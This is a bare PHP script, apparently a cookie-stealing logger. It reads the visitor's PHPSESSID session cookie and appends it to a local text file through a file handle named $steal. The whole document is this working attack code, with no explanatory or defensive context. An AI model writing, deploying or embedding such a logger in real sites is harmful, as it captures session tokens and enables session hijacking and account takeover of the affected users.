<?php
	$cookie = $_COOKIE['PHPSESSID'];
	$steal = fopen('cookiefile.txt', 'a+') or die("Can't open the file!!");
	fwrite($steal, $cookie ."\n\n");
	fclose($steal);
?>